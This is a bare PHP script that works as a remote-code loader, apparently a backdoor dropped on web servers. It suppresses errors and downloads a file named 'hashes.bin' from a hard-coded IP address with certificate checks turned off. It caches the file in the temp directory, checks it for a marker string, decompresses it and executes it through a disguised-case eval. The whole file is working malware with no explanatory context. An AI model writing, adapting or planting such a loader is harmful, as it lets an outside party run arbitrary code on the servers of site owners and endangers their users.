<?php
error_reporting(0);

function loader($dir, $output) {	
  $url = "http://103.84.207.191/hashes.bin";	
  if(ini_get('allow_url_fopen')) {
     $output = file_get_contents($url);
     file_put_contents($dir, $output);
  }else if(function_exists('curl_init')){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     $head = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     if($httpCode  == 200) {
        $output =  $head;
     }else {
        die("fail to fetch url");
     }
       file_put_contents($dir, $output);
  }
}

$dir =  sys_get_temp_dir() . "/hashes.bin";

if(!file_exists($dir)) {
	loader($dir, $output);
	$file = file_get_contents($dir);
}

if(!preg_match('/#!\[]\*932@\(\)\!\*&{__}\$/', $file)) {
	 chmod($dir, 0644);
	 loader($dir, $output);
}
$file = file_get_contents($dir);
$add = str_replace("#![]*932@()!*&{__}$", '', $file);
$div = gzuncompress($add);
EvAL    ("?>" . $div);

?>
